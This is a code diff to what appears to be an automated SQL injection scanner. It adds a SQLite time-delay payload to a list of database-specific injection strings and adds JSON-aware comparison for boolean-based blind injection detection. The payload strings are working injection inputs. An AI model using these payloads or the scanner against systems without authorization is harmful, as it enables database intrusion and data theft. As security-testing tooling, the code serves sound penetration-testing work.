@@ -94,6 +94,8 @@ TIME_PAYLOADS: list[tuple[str, str, int]] = [
     ("PostgreSQL", "'; SELECT pg_sleep(5)--", 5),
     ("MSSQL", "'; WAITFOR DELAY '0:0:5'--", 5),
     ("Oracle", "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
+    # SQLite has no SLEEP: use randomblob() to force heavy computation
+    ("SQLite", "' AND 1=randomblob(500000000)-- -", 5),
     # Stacked queries -- test for multi-statement support
     ("MySQL", "'; SELECT SLEEP(5);--", 5),
     ("PostgreSQL", "'; SELECT pg_sleep(5);--", 5),
@@ -199,6 +201,66 @@ class SQLiResult:
                 steps.append("Decode obtained JWT token and run plan(action='post_auth')")
             steps.append("Run injection_test on related endpoints")
         return steps
+
+
+# ---------------------------------------------------------------------------
+# JSON-aware semantic comparison for boolean-based detection
+# ---------------------------------------------------------------------------
+
+
+def _json_semantic_diff(true_resp: httpx.Response, false_resp: httpx.Response) -> str:
+    """Compare two responses semantically when Content-Type is JSON.
+
+    Returns a short description of the difference, or empty string if
+    responses are semantically equivalent or not JSON.
+    """
+    ct = (true_resp.headers.get("content-type") or "").lower()
+    if "json" not in ct:
+        return ""
+
+    try:
+        true_data = true_resp.json()
+        false_data = false_resp.json()
+    except Exception:
+        return ""
+
+    # Array length comparison (e.g. search results: [] vs [{...}, ...])
+    if isinstance(true_data, list) and isinstance(false_data, list):
+        tl, fl = len(true_data), len(false_data)
+        if tl != fl:
+            return f"array length {tl} vs {fl}"
+        return ""
+
+    # Object key difference
+    if isinstance(true_data, dict) and isinstance(false_data, dict):
+        tk, fk = set(true_data.keys()), set(false_data.keys())
+        diff_keys = tk.symmetric_difference(fk)
+        if diff_keys:
+            return f"different keys: {', '.join(sorted(diff_keys)[:5])}"
+
+        # Same keys but different non-trivial values (ignore timestamps/tokens)
+        diffs = 0
+        for key in tk:
+            tv, fv = true_data[key], false_data[key]
+            if tv != fv:
+                # Skip fields that look like timestamps or nonces
+                if isinstance(tv, (int, float)) and isinstance(fv, (int, float)):
+                    if abs(tv - fv) < 10:
+                        continue
+                diffs += 1
+        if diffs > 0:
+            return f"{diffs} value(s) differ"
+
+    # Nested: dict containing a "data" array (common API pattern)
+    if isinstance(true_data, dict) and isinstance(false_data, dict):
+        for key in ("data", "results", "items", "rows"):
+            if key in true_data and key in false_data:
+                tl = true_data[key] if isinstance(true_data[key], list) else None
+                fl = false_data[key] if isinstance(false_data[key], list) else None
+                if tl is not None and fl is not None and len(tl) != len(fl):
+                    return f"{key} array length {len(tl)} vs {len(fl)}"
+
+    return ""
 
 
 # ---------------------------------------------------------------------------
@@ -562,6 +624,10 @@ class PythonSQLiTester:
         A significant difference in response length (>10%) between
         a tautology (``1=1``) and a contradiction (``1=2``) indicates
         the SQL condition is being evaluated server-side.
+
+        For JSON responses, also performs semantic comparison (array length,
+        key presence) to catch cases where byte-length difference is small
+        but the data content clearly differs.
         """
         boolean_pairs = list(BOOLEAN_PAIRS)
         if self._waf_evasion:
@@ -597,27 +663,40 @@ class PythonSQLiTester:
             true_len = len(true_resp.text)
             false_len = len(false_resp.text)
 
-            # Significant difference: >10% body length change AND different content
-            if true_len > 0 and false_len > 0:
-                diff_ratio = abs(true_len - false_len) / max(true_len, false_len)
-                if diff_ratio > 0.10 and true_resp.text != false_resp.text:
-                    logger.info(
-                        "Phase 2 HIT: boolean_based on param=%s diff=%.1f%%",
-                        param,
-                        diff_ratio * 100,
-                    )
-                    return SQLiVulnerability(
-                        param=param,
-                        location=location,
-                        technique="boolean_based",
-                        evidence=(
-                            f"True response: {true_len} bytes, "
-                            f"False response: {false_len} bytes "
-                            f"(diff: {diff_ratio:.1%})"
-                        ),
-                        payload=true_payload,
-                        confidence=0.6,
-                    )
+            if true_len == 0 and false_len == 0:
+                continue
+
+            # Method 1: Byte-length diff (works for any format)
+            diff_ratio = abs(true_len - false_len) / max(true_len, false_len) if max(true_len, false_len) > 0 else 0
+            byte_diff_significant = diff_ratio > 0.10 and true_resp.text != false_resp.text
+
+            # Method 2: JSON semantic diff (catches small JSON responses)
+            json_diff = _json_semantic_diff(true_resp, false_resp)
+
+            if byte_diff_significant or json_diff:
+                technique_detail = "byte-length" if byte_diff_significant else "json-semantic"
+                evidence = (
+                    f"True response: {true_len} bytes, "
+                    f"False response: {false_len} bytes "
+                    f"(diff: {diff_ratio:.1%}, detection: {technique_detail})"
+                )
+                if json_diff:
+                    evidence += f". JSON diff: {json_diff}"
+
+                logger.info(
+                    "Phase 2 HIT: boolean_based on param=%s diff=%.1f%% method=%s",
+                    param,
+                    diff_ratio * 100,
+                    technique_detail,
+                )
+                return SQLiVulnerability(
+                    param=param,
+                    location=location,
+                    technique="boolean_based",
+                    evidence=evidence,
+                    payload=true_payload,
+                    confidence=0.65 if json_diff else 0.6,
+                )
         return None
 
     # ------------------------------------------------------------------
